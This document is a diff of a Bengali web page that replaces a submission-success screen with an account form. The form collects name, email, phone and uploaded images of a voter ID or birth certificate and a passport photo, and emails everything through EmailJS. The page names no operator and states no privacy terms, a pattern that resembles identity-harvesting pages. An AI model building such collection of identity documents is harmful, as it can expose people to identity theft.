@@ -1,14 +1,33 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>সফল সাবমিশন</title>
-</head>
-<body style="font-family:sans-serif; text-align:center; margin-top:50px;">
-  <h2 style="color:green;">✅ আপনার তথ্য সফলভাবে সাবমিট হয়েছে!</h2>
-  <p>আমরা শিগগিরই আপনার সাথে যোগাযোগ করব।</p>
+<div class="card">
+    <h2>অ্যাকাউন্ট তৈরি ফর্ম</h2>
+    <form id="accountForm">
+      <input type="text" name="first_name" placeholder="প্রথম নাম" required>
+      <input type="text" name="last_name" placeholder="শেষ নাম" required>
+      <input type="email" name="email" placeholder="ইমেইল এড্রেস" required>
+      <input type="text" name="phone" placeholder="ফোন নাম্বার" required>
+      <label>ভোটার আইডি / জন্ম নিবন্ধন:</label>
+      <input type="file" name="nid_file" accept="image/*" required>
+      <label>পাসপোর্ট সাইজ ছবি:</label>
+      <input type="file" name="photo_file" accept="image/*" required>
+      <button type="submit">সাবমিট</button>
+    </form>
+  </div>
 
-  <a href="payment.html" style="display:inline-block; margin-top:20px; padding:10px 20px; background:blue; color:white; text-decoration:none; border-radius:5px;">আবার ফর্মে যান</a>
+  <script>
+    (function(){
+      emailjs.init("m8V9A-gtcFxKnDBdh"); // তোমার Public Key
+    })();
+
+    document.getElementById("accountForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      emailjs.sendForm("service_zyz27er", "template_07gauvb", this)
+      .then(function(response) {
+        alert("✅ অ্যাকাউন্ট তথ্য পাঠানো হয়েছে!");
+      }, function(error) {
+        alert("❌ কিছু ভুল হয়েছে, আবার চেষ্টা করুন।");
+      });
+    });
+  </script>
 </body>
-</html>
+        </html>html>
